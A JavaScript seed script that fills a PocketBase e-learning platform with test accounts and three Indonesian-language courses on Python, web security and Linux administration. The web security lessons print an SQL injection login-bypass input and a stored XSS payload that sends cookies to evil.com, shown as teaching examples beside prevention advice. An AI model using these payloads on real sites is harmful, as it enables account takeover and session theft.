/**
 * PocketBase Seed Script
 * 
 * Creates sample data for testing all MVP features:
 * - 1 admin user, 1 instructor user, 1 student user
 * - 3 courses (beginner, intermediate, advanced) with modules & lessons
 * - Quiz questions for quiz-type lessons
 * 
 * Usage:
 *   node scripts/seed.mjs
 * 
 * Prerequisites:
 *   - PocketBase running at http://localhost:8090
 *   - Migrations applied (categories, collections exist)
 */

import PocketBase from 'pocketbase';

const PB_URL = process.env.PUBLIC_POCKETBASE_URL || 'http://localhost:8090';
const pb = new PocketBase(PB_URL);

// ─── User accounts ──────────────────────────────────────────────
const USERS = {
    admin: { email: 'admin@bariskode.org', password: 'admin12345', username: 'admin', role: 'admin', bio: 'Platform administrator' },
    instructor: { email: 'instructor@bariskode.org', password: 'instructor12345', username: 'pak_cyber', role: 'instructor', bio: 'Cybersecurity expert & instructor' },
    student: { email: 'student@bariskode.org', password: 'student12345', username: 'siswa_baru', role: 'student', bio: 'Baru belajar cybersecurity' },
};

// ─── Courses data ──────────────────────────────────────────────
const COURSES = [
    {
        title: 'Dasar-Dasar Pemrograman Python',
        slug: 'dasar-pemrograman-python',
        description: 'Pelajari dasar-dasar pemrograman menggunakan bahasa Python. Cocok untuk pemula yang ingin memulai perjalanan coding.',
        difficulty: 'beginner',
        categorySlug: 'python',
        tags: ['python', 'programming', 'beginner'],
        estimated_hours: 10,
        total_lessons: 8,
        modules: [
            {
                title: 'Pengenalan Python',
                order: 1,
                description: 'Mengenal bahasa Python dan cara instalasinya.',
                lessons: [
                    {
                        title: 'Apa itu Python?',
                        slug: 'apa-itu-python',
                        type: 'reading',
                        order: 1,
                        xp_reward: 10,
                        estimated_minutes: 15,
                        content: `# Apa itu Python?

Python adalah bahasa pemrograman **tingkat tinggi** yang dirancang dengan filosofi "readability counts". Diciptakan oleh Guido van Rossum dan pertama kali dirilis tahun 1991.

## Mengapa Python?

- ✅ **Mudah Dipelajari** — Sintaksnya mirip bahasa Inggris
- ✅ **Serbaguna** — Web, Data Science, AI, Cybersecurity
- ✅ **Komunitas Besar** — Ribuan library open-source tersedia
- ✅ **Banyak Peluang Kerja** — Salah satu bahasa paling dicari

## Hello World

\`\`\`python
print("Hello, World!")
\`\`\`

## Instalasi Python

1. Kunjungi [python.org](https://python.org)
2. Download versi terbaru (3.12+)
3. Install dan centang "Add to PATH"
4. Buka terminal, ketik \`python --version\`

> 💡 **Tips:** Gunakan VS Code sebagai editor dengan extension Python.`,
                    },
                    {
                        title: 'Variabel dan Tipe Data',
                        slug: 'variabel-tipe-data',
                        type: 'reading',
                        order: 2,
                        xp_reward: 15,
                        estimated_minutes: 20,
                        content: `# Variabel dan Tipe Data

## Membuat Variabel

Di Python, variabel dibuat langsung tanpa deklarasi tipe:

\`\`\`python
nama = "Budi"
umur = 25
tinggi = 170.5
aktif = True
\`\`\`

## Tipe Data Dasar

| Tipe | Contoh | Keterangan |
|------|--------|------------|
| \`str\` | \`"hello"\` | Teks |
| \`int\` | \`42\` | Bilangan bulat |
| \`float\` | \`3.14\` | Bilangan desimal |
| \`bool\` | \`True/False\` | Boolean |
| \`list\` | \`[1, 2, 3]\` | Array |
| \`dict\` | \`{"key": "val"}\` | Object |

## Type Checking

\`\`\`python
x = 42
print(type(x))  # <class 'int'>

y = "hello"
print(type(y))  # <class 'str'>
\`\`\`

## Konversi Tipe

\`\`\`python
angka_str = "100"
angka_int = int(angka_str)  # 100
angka_float = float(angka_str)  # 100.0
\`\`\``,
                    },
                    {
                        title: 'Quiz: Pengenalan Python',
                        slug: 'quiz-pengenalan-python',
                        type: 'quiz',
                        order: 3,
                        xp_reward: 25,
                        estimated_minutes: 10,
                        passing_score: 70,
                        max_attempts: 3,
                        questions: [
                            {
                                question: 'Siapa pencipta bahasa Python?',
                                type: 'multiple_choice',
                                options: [
                                    { text: 'Linus Torvalds', is_correct: false },
                                    { text: 'Guido van Rossum', is_correct: true },
                                    { text: 'James Gosling', is_correct: false },
                                    { text: 'Brendan Eich', is_correct: false },
                                ],
                                explanation: 'Guido van Rossum menciptakan Python dan merilisnya pertama kali tahun 1991.',
                                order: 1,
                            },
                            {
                                question: 'Tipe data apa yang digunakan untuk menyimpan teks di Python?',
                                type: 'multiple_choice',
                                options: [
                                    { text: 'int', is_correct: false },
                                    { text: 'bool', is_correct: false },
                                    { text: 'str', is_correct: true },
                                    { text: 'float', is_correct: false },
                                ],
                                explanation: '`str` (string) adalah tipe data untuk menyimpan teks di Python.',
                                order: 2,
                            },
                            {
                                question: 'Output dari `type(3.14)` adalah `<class \'float\'>`.',
                                type: 'true_false',
                                options: [
                                    { text: 'Benar', is_correct: true },
                                    { text: 'Salah', is_correct: false },
                                ],
                                explanation: '3.14 adalah bilangan desimal, sehingga tipe datanya adalah float.',
                                order: 3,
                            },
                        ],
                    },
                ],
            },
            {
                title: 'Kontrol Flow',
                order: 2,
                description: 'Conditional statements dan looping.',
                lessons: [
                    {
                        title: 'If-Else Statements',
                        slug: 'if-else-statements',
                        type: 'reading',
                        order: 1,
                        xp_reward: 15,
                        estimated_minutes: 20,
                        content: `# If-Else Statements

## Syntax Dasar

\`\`\`python
umur = 18

if umur >= 18:
    print("Dewasa")
elif umur >= 13:
    print("Remaja")
else:
    print("Anak-anak")
\`\`\`

## Operator Perbandingan

| Operator | Arti |
|----------|------|
| \`==\` | Sama dengan |
| \`!=\` | Tidak sama |
| \`>\` | Lebih besar |
| \`<\` | Lebih kecil |
| \`>=\` | Lebih besar atau sama |
| \`<=\` | Lebih kecil atau sama |

## Operator Logika

\`\`\`python
x = 10

if x > 5 and x < 15:
    print("x antara 5 dan 15")

if x == 10 or x == 20:
    print("x adalah 10 atau 20")

if not x == 5:
    print("x bukan 5")
\`\`\``,
                    },
                    {
                        title: 'Looping (For & While)',
                        slug: 'looping-for-while',
                        type: 'reading',
                        order: 2,
                        xp_reward: 15,
                        estimated_minutes: 25,
                        content: `# Looping

## For Loop

\`\`\`python
# Loop melalui list
buah = ["apel", "mangga", "jeruk"]
for b in buah:
    print(b)

# Loop dengan range
for i in range(5):
    print(i)  # 0, 1, 2, 3, 4

# Loop dengan enumerate
for i, b in enumerate(buah):
    print(f"{i}: {b}")
\`\`\`

## While Loop

\`\`\`python
counter = 0
while counter < 5:
    print(counter)
    counter += 1
\`\`\`

## Break & Continue

\`\`\`python
for i in range(10):
    if i == 5:
        break  # Berhenti total
    if i % 2 == 0:
        continue  # Skip iterasi ini
    print(i)  # 1, 3
\`\`\``,
                    },
                    {
                        title: 'Video: Python Control Flow',
                        slug: 'video-control-flow',
                        type: 'video',
                        order: 3,
                        xp_reward: 10,
                        estimated_minutes: 15,
                        video_url: 'https://www.youtube.com/watch?v=Zp5MuPOtsSY',
                    },
                ],
            },
            {
                title: 'Functions & Modules',
                order: 3,
                description: 'Mengenal fungsi dan cara menggunakan module.',
                lessons: [
                    {
                        title: 'Membuat Fungsi',
                        slug: 'membuat-fungsi',
                        type: 'reading',
                        order: 1,
                        xp_reward: 20,
                        estimated_minutes: 25,
                        content: `# Fungsi di Python

## Definisi Fungsi

\`\`\`python
def sapa(nama):
    return f"Hello, {nama}!"

pesan = sapa("Budi")
print(pesan)  # Hello, Budi!
\`\`\`

## Parameter Default

\`\`\`python
def power(base, exp=2):
    return base ** exp

print(power(3))     # 9
print(power(3, 3))  # 27
\`\`\`

## Lambda

\`\`\`python
kuadrat = lambda x: x ** 2
print(kuadrat(5))  # 25

angka = [1, 2, 3, 4, 5]
genap = list(filter(lambda x: x % 2 == 0, angka))
print(genap)  # [2, 4]
\`\`\``,
                    },
                    {
                        title: 'Quiz Akhir: Dasar Python',
                        slug: 'quiz-akhir-dasar-python',
                        type: 'quiz',
                        order: 2,
                        xp_reward: 30,
                        estimated_minutes: 15,
                        passing_score: 70,
                        max_attempts: 0,
                        questions: [
                            {
                                question: 'Keyword untuk mendefinisikan fungsi di Python adalah...',
                                type: 'multiple_choice',
                                options: [
                                    { text: 'function', is_correct: false },
                                    { text: 'def', is_correct: true },
                                    { text: 'fn', is_correct: false },
                                    { text: 'func', is_correct: false },
                                ],
                                explanation: 'Python menggunakan keyword `def` untuk mendefinisikan fungsi.',
                                order: 1,
                            },
                            {
                                question: 'Apa output dari: `for i in range(3): print(i)`?',
                                type: 'multiple_choice',
                                options: [
                                    { text: '1 2 3', is_correct: false },
                                    { text: '0 1 2', is_correct: true },
                                    { text: '0 1 2 3', is_correct: false },
                                    { text: '1 2', is_correct: false },
                                ],
                                explanation: '`range(3)` menghasilkan 0, 1, 2 (tidak termasuk 3).',
                                order: 2,
                            },
                            {
                                question: '`break` menghentikan loop sepenuhnya, sedangkan `continue` hanya melewati iterasi saat ini.',
                                type: 'true_false',
                                options: [
                                    { text: 'Benar', is_correct: true },
                                    { text: 'Salah', is_correct: false },
                                ],
                                explanation: 'Benar. `break` keluar dari loop, `continue` lompat ke iterasi berikutnya.',
                                order: 3,
                            },
                        ],
                    },
                ],
            },
        ],
    },

    {
        title: 'Web Security Fundamentals',
        slug: 'web-security-fundamentals',
        description: 'Pelajari dasar-dasar keamanan web. Memahami OWASP Top 10, XSS, SQL Injection, dan cara pencegahannya.',
        difficulty: 'intermediate',
        categorySlug: 'cybersecurity',
        tags: ['security', 'web', 'owasp', 'xss', 'sql-injection'],
        estimated_hours: 15,
        total_lessons: 6,
        modules: [
            {
                title: 'Pengenalan Web Security',
                order: 1,
                description: 'Konsep dasar keamanan web.',
                lessons: [
                    {
                        title: 'Mengapa Web Security Penting?',
                        slug: 'mengapa-web-security-penting',
                        type: 'reading',
                        order: 1,
                        xp_reward: 15,
                        estimated_minutes: 20,
                        content: `# Mengapa Web Security Penting?

## The State of Web Security

Setiap hari, ribuan website diserang oleh hacker. Data breach bisa menyebabkan:
- 💰 Kerugian finansial jutaan dolar
- 👤 Kebocoran data pribadi pengguna
- 🏢 Hilangnya reputasi perusahaan
- ⚖️ Konsekuensi hukum (GDPR, UU PDP)

## OWASP Top 10 (2021)

| Rank | Vulnerability |
|------|--------------|
| 1 | Broken Access Control |
| 2 | Cryptographic Failures |
| 3 | Injection |
| 4 | Insecure Design |
| 5 | Security Misconfiguration |
| 6 | Vulnerable Components |
| 7 | Auth & ID Failures |
| 8 | Software & Data Integrity |
| 9 | Security Logging Failures |
| 10 | SSRF |

## CIA Triad

- **Confidentiality** — Data hanya bisa diakses oleh pihak berwenang
- **Integrity** — Data tidak bisa diubah tanpa otorisasi
- **Availability** — Sistem selalu tersedia saat dibutuhkan`,
                    },
                    {
                        title: 'Video: OWASP Top 10 Explained',
                        slug: 'video-owasp-top-10',
                        type: 'video',
                        order: 2,
                        xp_reward: 10,
                        estimated_minutes: 20,
                        video_url: 'https://www.youtube.com/watch?v=avFR_Af0KGk',
                    },
                ],
            },
            {
                title: 'Injection Attacks',
                order: 2,
                description: 'SQL Injection dan XSS.',
                lessons: [
                    {
                        title: 'SQL Injection',
                        slug: 'sql-injection',
                        type: 'reading',
                        order: 1,
                        xp_reward: 20,
                        estimated_minutes: 30,
                        content: `# SQL Injection

## Apa itu SQL Injection?

SQL Injection (SQLi) terjadi ketika input pengguna disisipkan langsung ke query SQL tanpa sanitasi.

## Contoh Serangan

\`\`\`sql
-- Query vulnerable
SELECT * FROM users WHERE username = '$input' AND password = '$pass'

-- Input: admin' --
-- Menjadi:
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
-- Komentar SQL (--) menghilangkan password check!
\`\`\`

## Pencegahan

### 1. Parameterized Queries

\`\`\`python
# ❌ BURUK — vulnerable
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# ✅ BAIK — parameterized
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
\`\`\`

### 2. ORM (Object-Relational Mapping)

\`\`\`python
# SQLAlchemy — otomatis parameterized
user = db.session.query(User).filter_by(id=user_id).first()
\`\`\`

### 3. Input Validation
- Whitelist karakter yang diizinkan
- Escape special characters
- Gunakan prepared statements`,
                    },
                    {
                        title: 'Cross-Site Scripting (XSS)',
                        slug: 'cross-site-scripting',
                        type: 'reading',
                        order: 2,
                        xp_reward: 20,
                        estimated_minutes: 25,
                        content: `# Cross-Site Scripting (XSS)

## Jenis XSS

### Stored XSS
Script disimpan di server (database), dijalankan saat user lain membuka halaman.

\`\`\`html
<!-- Stored in DB as comment -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

### Reflected XSS
Script dikirim melalui URL dan di-reflect di halaman.

\`\`\`
https://site.com/search?q=<script>alert('XSS')</script>
\`\`\`

### DOM-based XSS
Script dieksekusi di client-side melalui manipulasi DOM.

## Pencegahan

\`\`\`javascript
// ❌ BURUK
element.innerHTML = userInput;

// ✅ BAIK
element.textContent = userInput;

// ✅ Library sanitasi
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
\`\`\`

## Content Security Policy (CSP)

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self';
\`\`\``,
                    },
                    {
                        title: 'Quiz: Web Vulnerabilities',
                        slug: 'quiz-web-vulnerabilities',
                        type: 'quiz',
                        order: 3,
                        xp_reward: 30,
                        estimated_minutes: 10,
                        passing_score: 70,
                        max_attempts: 0,
                        questions: [
                            {
                                question: 'Cara terbaik mencegah SQL Injection adalah...',
                                type: 'multiple_choice',
                                options: [
                                    { text: 'Menggunakan HTTPS', is_correct: false },
                                    { text: 'Parameterized queries / Prepared statements', is_correct: true },
                                    { text: 'Membatasi panjang input', is_correct: false },
                                    { text: 'Menggunakan POST instead of GET', is_correct: false },
                                ],
                                explanation: 'Parameterized queries memisahkan data dari query SQL, sehingga input tidak bisa diinterpretasikan sebagai SQL.',
                                order: 1,
                            },
                            {
                                question: 'Stored XSS lebih berbahaya dari Reflected XSS karena...',
                                type: 'multiple_choice',
                                options: [
                                    { text: 'Lebih sulit di-patch', is_correct: false },
                                    { text: 'Script tersimpan di server dan bisa menyerang semua pengunjung', is_correct: true },
                                    { text: 'Hanya bisa dicegah dengan firewall', is_correct: false },
                                    { text: 'Tidak bisa dicegah sama sekali', is_correct: false },
                                ],
                                explanation: 'Stored XSS tersimpan di database server, sehingga akan dieksekusi setiap kali ada user yang membuka halaman tersebut.',
                                order: 2,
                            },
                            {
                                question: 'CSP (Content Security Policy) adalah header HTTP yang bisa mencegah XSS.',
                                type: 'true_false',
                                options: [
                                    { text: 'Benar', is_correct: true },
                                    { text: 'Salah', is_correct: false },
                                ],
                                explanation: 'CSP membatasi sumber script yang boleh dijalankan, sehingga bisa mencegah inline script injections.',
                                order: 3,
                            },
                        ],
                    },
                ],
            },
            {
                title: 'Praktik Keamanan',
                order: 3,
                description: 'Best practices keamanan web modern.',
                lessons: [
                    {
                        title: 'Authentication Best Practices',
                        slug: 'authentication-best-practices',
                        type: 'reading',
                        order: 1,
                        xp_reward: 20,
                        estimated_minutes: 25,
                        content: `# Authentication Best Practices

## Password Hashing

\`\`\`python
# ❌ JANGAN simpan password plain text!
# ❌ JANGAN gunakan MD5 atau SHA1

# ✅ Gunakan bcrypt
import bcrypt

password = "user_password".encode('utf-8')
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))

# Verifikasi
bcrypt.checkpw(password, hashed)  # True
\`\`\`

## Multi-Factor Authentication (MFA)

1. **Something you know** — Password
2. **Something you have** — Phone / TOTP app
3. **Something you are** — Biometric

## Session Management

- Set \`HttpOnly\` flag pada cookies
- Set \`Secure\` flag (HTTPS only)
- Set \`SameSite=Strict\` atau \`Lax\`
- Implementasi session timeout
- Regenerate session ID setelah login`,
                    },
                ],
            },
        ],
    },

    {
        title: 'Advanced Linux Administration',
        slug: 'advanced-linux-administration',
        description: 'Menguasai administrasi Linux tingkat lanjut. Systemd, networking, hardening, dan automation.',
        difficulty: 'advanced',
        categorySlug: 'linux-bash',
        tags: ['linux', 'sysadmin', 'bash', 'devops', 'security'],
        estimated_hours: 20,
        total_lessons: 4,
        modules: [
            {
                title: 'Systemd & Service Management',
                order: 1,
                description: 'Mengelola services dengan systemd.',
                lessons: [
                    {
                        title: 'Memahami Systemd',
                        slug: 'memahami-systemd',
                        type: 'reading',
                        order: 1,
                        xp_reward: 25,
                        estimated_minutes: 30,
                        content: `# Systemd

## Unit Files

Systemd menggunakan unit files untuk mengelola services.

\`\`\`ini
# /etc/systemd/system/myapp.service
[Unit]
Description=My Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/myapp
ExecStart=/usr/bin/node server.js
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
\`\`\`

## Perintah Dasar

\`\`\`bash
# Enable & start service
sudo systemctl enable --now myapp.service

# Cek status
sudo systemctl status myapp.service

# Lihat logs
sudo journalctl -u myapp.service -f

# Reload setelah edit unit file
sudo systemctl daemon-reload
\`\`\``,
                    },
                    {
                        title: 'Linux Networking & Firewall',
                        slug: 'linux-networking-firewall',
                        type: 'reading',
                        order: 2,
                        xp_reward: 25,
                        estimated_minutes: 35,
                        content: `# Linux Networking & Firewall

## Network Diagnostics

\`\`\`bash
# IP address
ip addr show

# Routing table
ip route show

# DNS resolution
dig example.com
nslookup example.com

# Port scanning
ss -tulnp
\`\`\`

## UFW (Uncomplicated Firewall)

\`\`\`bash
# Enable firewall
sudo ufw enable

# Allow SSH
sudo ufw allow 22/tcp

# Allow HTTP & HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Deny all incoming by default
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Check status
sudo ufw status verbose
\`\`\`

## iptables (Advanced)

\`\`\`bash
# Block IP
sudo iptables -A INPUT -s 192.168.1.100 -j DROP

# Rate limiting (prevent brute force)
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
\`\`\``,
                    },
                    {
                        title: 'Quiz: Linux Administration',
                        slug: 'quiz-linux-administration',
                        type: 'quiz',
                        order: 3,
                        xp_reward: 35,
                        estimated_minutes: 10,
                        passing_score: 80,
                        max_attempts: 2,
                        questions: [
                            {
                                question: 'Perintah untuk melihat log real-time dari service systemd adalah...',
                                type: 'multiple_choice',
                                options: [
                                    { text: 'tail -f /var/log/syslog', is_correct: false },
                                    { text: 'journalctl -u myservice -f', is_correct: true },
                                    { text: 'systemctl log myservice', is_correct: false },
                                    { text: 'dmesg | grep myservice', is_correct: false },
                                ],
                                explanation: '`journalctl -u <service> -f` menunjukkan log service secara real-time (follow mode).',
                                order: 1,
                            },
                            {
                                question: 'UFW directive `sudo ufw default deny incoming` akan memblokir semua koneksi masuk kecuali yang di-allow.',
                                type: 'true_false',
                                options: [
                                    { text: 'Benar', is_correct: true },
                                    { text: 'Salah', is_correct: false },
                                ],
                                explanation: 'Benar. Policy default deny berarti semua incoming traffic diblokir kecuali yang secara eksplisit di-allow.',
                                order: 2,
                            },
                            {
                                question: 'Section apa di systemd unit file yang mendefinisikan kapan service di-start otomatis?',
                                type: 'multiple_choice',
                                options: [
                                    { text: '[Unit]', is_correct: false },
                                    { text: '[Service]', is_correct: false },
                                    { text: '[Install]', is_correct: true },
                                    { text: '[Timer]', is_correct: false },
                                ],
                                explanation: 'Section [Install] dengan `WantedBy=multi-user.target` menentukan autostart behavior.',
                                order: 3,
                            },
                        ],
                    },
                    {
                        title: 'Server Hardening Checklist',
                        slug: 'server-hardening-checklist',
                        type: 'reading',
                        order: 4,
                        xp_reward: 25,
                        estimated_minutes: 30,
                        content: `# Server Hardening Checklist

## SSH Hardening

\`\`\`bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
Protocol 2
\`\`\`

## Automatic Updates

\`\`\`bash
# Ubuntu/Debian
sudo apt install unattended-upgrades
sudo dpkg-reconfigure unattended-upgrades
\`\`\`

## Fail2ban

\`\`\`bash
sudo apt install fail2ban

# /etc/fail2ban/jail.local
[sshd]
enabled = true
port = 22
maxretry = 3
bantime = 3600
\`\`\`

## Checklist

- [ ] Disable root SSH login
- [ ] Use SSH key authentication
- [ ] Configure firewall (UFW/iptables)
- [ ] Install Fail2ban
- [ ] Enable automatic security updates
- [ ] Set up log monitoring
- [ ] Remove unnecessary services
- [ ] Configure file permissions (chmod/chown)`,
                    },
                ],
            },
        ],
    },
];

// ────────────────────────────────────────────────────────────────
// Seeder logic
// ────────────────────────────────────────────────────────────────

async function seed() {
    console.log('🌱 Starting seed process...');
    console.log(`📡 PocketBase URL: ${PB_URL}\n`);

    // 1. Authenticate as admin (first user = admin)
    try {
        await pb.admins.authWithPassword(
            process.env.PB_ADMIN_EMAIL || 'admin@bariskode.org',
            process.env.PB_ADMIN_PASSWORD || 'admin12345678'
        );
        console.log('✅ Authenticated as admin');
    } catch (err) {
        console.error('❌ Failed to authenticate as admin. Make sure you have created an admin account in PocketBase.');
        console.error('   Visit http://localhost:8090/_/ to create one.');
        console.error('   Then set PB_ADMIN_EMAIL and PB_ADMIN_PASSWORD env vars, or use defaults.');
        process.exit(1);
    }

    // 2. Create users
    console.log('\n📦 Creating users...');
    const userIds = {};

    for (const [key, userData] of Object.entries(USERS)) {
        try {
            // Check if user already exists
            let existing;
            try {
                existing = await pb.collection('users').getFirstListItem(`email = '${userData.email}'`);
            } catch { /* not found */ }

            if (existing) {
                userIds[key] = existing.id;
                console.log(`  ⏭️  User "${userData.username}" already exists (${existing.id})`);
            } else {
                const user = await pb.collection('users').create({
                    email: userData.email,
                    password: userData.password,
                    passwordConfirm: userData.password,
                    username: userData.username,
                    name: userData.username,
                    role: userData.role,
                    bio: userData.bio,
                    xp: key === 'student' ? 50 : key === 'instructor' ? 500 : 1,
                    level: key === 'instructor' ? 5 : 1,
                    streak_current: key === 'student' ? 3 : 1,
                    streak_longest: key === 'student' ? 7 : 1,
                    emailVisibility: true,
                });
                userIds[key] = user.id;
                console.log(`  ✅ Created user "${userData.username}" (${user.id})`);
            }
        } catch (err) {
            console.error(`  ❌ Failed to create user "${userData.username}":`, err.message);
            if (err.data) console.error('     Data:', JSON.stringify(err.data, null, 2));
        }
    }

    // 3. Get categories
    console.log('\n📦 Fetching categories...');
    const categories = await pb.collection('categories').getFullList();
    const categoryMap = {};
    for (const cat of categories) {
        categoryMap[cat.slug] = cat.id;
    }
    console.log(`  ✅ Found ${categories.length} categories`);

    // 4. Create courses, modules, lessons, quiz questions
    console.log('\n📦 Creating courses...');

    for (const courseData of COURSES) {
        let courseId;

        // Check if course already exists
        try {
            const existing = await pb.collection('courses').getFirstListItem(`slug = '${courseData.slug}'`);
            courseId = existing.id;
            console.log(`  ⏭️  Course "${courseData.title}" already exists (${courseId})`);
            continue; // Skip if course exists
        } catch { /* not found — create */ }

        try {
            const categoryId = categoryMap[courseData.categorySlug];
            if (!categoryId) {
                console.error(`  ❌ Category "${courseData.categorySlug}" not found, skipping course "${courseData.title}"`);
                continue;
            }

            const course = await pb.collection('courses').create({
                title: courseData.title,
                slug: courseData.slug,
                description: courseData.description,
                instructor: userIds.instructor,
                category: categoryId,
                difficulty: courseData.difficulty,
                tags: courseData.tags,
                status: 'published',
                estimated_hours: courseData.estimated_hours,
                total_lessons: courseData.total_lessons,
                enrolled_count: Math.floor(Math.random() * 50) + 5,
            });
            courseId = course.id;
            console.log(`  ✅ Created course "${courseData.title}" (${courseId})`);

            // Create modules
            for (const moduleData of courseData.modules) {
                const mod = await pb.collection('modules').create({
                    title: moduleData.title,
                    course: courseId,
                    order: moduleData.order,
                    description: moduleData.description || '',
                });
                console.log(`    📂 Module "${moduleData.title}" (${mod.id})`);

                // Create lessons
                for (const lessonData of moduleData.lessons) {
                    const lessonFields = {
                        title: lessonData.title,
                        slug: lessonData.slug,
                        module: mod.id,
                        type: lessonData.type,
                        content: lessonData.content || '',
                        video_url: lessonData.video_url || '',
                        xp_reward: lessonData.xp_reward,
                        order: lessonData.order,
                        status: 'published',
                        estimated_minutes: lessonData.estimated_minutes || 0,
                        passing_score: lessonData.passing_score || 0,
                        max_attempts: lessonData.max_attempts || 0,
                    };

                    const lesson = await pb.collection('lessons').create(lessonFields);
                    console.log(`      📄 Lesson "${lessonData.title}" (${lesson.id}) [${lessonData.type}]`);

                    // Create quiz questions if applicable
                    if (lessonData.questions) {
                        for (const qData of lessonData.questions) {
                            await pb.collection('quiz_questions').create({
                                lesson: lesson.id,
                                question: qData.question,
                                type: qData.type,
                                options: qData.options,
                                explanation: qData.explanation || '',
                                order: qData.order,
                            });
                        }
                        console.log(`        ❓ ${lessonData.questions.length} quiz questions created`);
                    }
                }
            }
        } catch (err) {
            console.error(`  ❌ Failed to create course "${courseData.title}":`, err.message);
            if (err.data) console.error('     Data:', JSON.stringify(err.data, null, 2));
        }
    }

    console.log('\n✨ Seed completed!');
    console.log('\n📋 Test Accounts:');
    console.log('   Admin:      admin@bariskode.org / admin12345');
    console.log('   Instructor: instructor@bariskode.org / instructor12345');
    console.log('   Student:    student@bariskode.org / student12345');
}

seed().catch(console.error);
